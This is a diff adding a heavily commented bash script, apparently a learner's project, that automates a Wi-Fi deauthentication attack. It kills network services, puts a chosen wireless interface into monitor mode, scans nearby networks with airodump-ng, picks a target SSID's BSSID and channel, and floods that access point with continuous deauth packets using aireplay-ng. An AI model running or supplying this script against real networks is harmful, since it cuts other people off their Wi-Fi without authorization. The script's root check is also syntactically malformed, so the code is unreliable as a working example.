@@ -1,0 +1,94 @@
+
+#!/bin/bash
+	# #! is the shelbang, indicating the interpreter must be at first line
+	# # elsewhere is a command
+if ["$EUID" -ne 0]; then 
+	# EUID, Effective User ID of the current user is not equal to 0
+		# which is used to check if user has root privileges
+		# in UNIX `root user has an EUID of 0`
+	echo "run as root"
+	exit # exit to re-run as root
+fi
+
+#TODO delete these after test
+#ip link set wlan0 down
+#iw wlan0 set type managed
+#ip link set wlan0 up
+airmon-ng check kill
+#systemctl start NetworkManager
+#sudo systemctl restart NetworkManager
+
+
+# continue if root 
+
+# select network interface
+echo "Avaliable Network Interfaces: "
+echo ""
+ip link show | grep -oP '(?<=: )\w+(?=:)'
+	# ip link show, is the comand to display all network interfaces
+	# grep, -o indicates to grep only the parts that match the pattern
+echo -n "Enter the wireless interface name" # input the interface
+read INTERFACE # put the read value to INTERFACE variable
+#MONITOR_MODE_INTERFACE="${INTERFACE}mon" # Define monitor mode interface name (adding 'mon' as a suffix)
+MONITOR_MODE_INTERFACE="${INTERFACE}" ## system does not require 
+echo "Starting Monitor Mode on $INTERFACE" 
+airmon-ng start $INTERFACE # use airmon-ng to 
+echo "Scanning for Networks"
+
+#Does not work# timeout 10 airodump-ng $MONITOR_MODE_INTERFACE -w /tmp/networks --output-format csv 
+	## line above runs for 20 seconds to scan for avaliable networks then saves the output to a CSV file in /temp with the name networks
+
+#using this instead#
+airodump-ng $MONITOR_MODE_INTERFACE -w /tmp/networks --output-format csv &
+echo "test"
+# the & at the end above makes the prosess run in the background
+AIRDUMP_PID=$! # this captures the prosses id and saves it to variable AIRDUMP_PID
+sleep 10 # waits 10 secs
+kill $AIRDUMP_PID # kills the process
+# i had to do it this way, the commented out way above was not quitting the airodump-ng
+
+echo "Available Networks:"
+# at this point to recover the saved file we can do 2 things 
+	# 1.
+	# go back and rewrite the airodump-ng to rewrite the networks-01.csv at each iteration
+		# we can allow this by writing the line below before airodump-ng
+		# rm -f /tmp/networks-01.csv
+	# code below will work if we do it like that
+# cat /tmp/networks-01.csv # TODO format the output later
+	# line above retrieves the CSV file
+	# but i want to keep logs so we will do it this way
+latest_file=$(ls /tmp/networks-*.csv | sort -V | tail -n 1)
+cat $latest_file # to get the latest record
+
+echo -n "Target SSID: "
+echo ""
+read TARGET_SSID
+# below gets the target information
+TARGET_INFO=$(grep "$TARGET_SSID" $latest_file | head -n 1)
+BSSID=$(echo $TARGET_INFO | cut -d ',' -f 1)
+CHANNEL=$(echo $TARGET_INFO | cut -d ',' -f 4 | tr -d '[:space:]')
+# below checks if BSSID and CHANNEL found
+# if not found exits
+if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
+    echo "Network not found. Exiting."
+    airmon-ng stop $MONITOR_MODE_INTERFACE
+    exit 1
+fi
+# below shows the user selected target
+echo "Target BSSID: $BSSID"
+echo "Target Channel: $CHANNEL"
+# below starts airodump-ng attack
+## airodump-ng --bssid $BSSID --channel $CHANNEL $MONITOR_MODE_INTERFACE &
+sleep 10 # sleep to ensure airodump-ng starts
+echo "Setting $MONITOR_MODE_INTERFACE to channel $CHANNEL"
+iwconfig $MONITOR_MODE_INTERFACE channel $CHANNEL
+sleep 2
+echo "Sending deauth packets to $BSSID..."
+aireplay-ng --deauth 0 -a $BSSID $MONITOR_MODE_INTERFACE
+sleep 60
+airmon-ng stop $MONITOR_MODE_INTERFACE
+systemctl start iwd
+
+## TODO
+# check if airmongng is installed
+
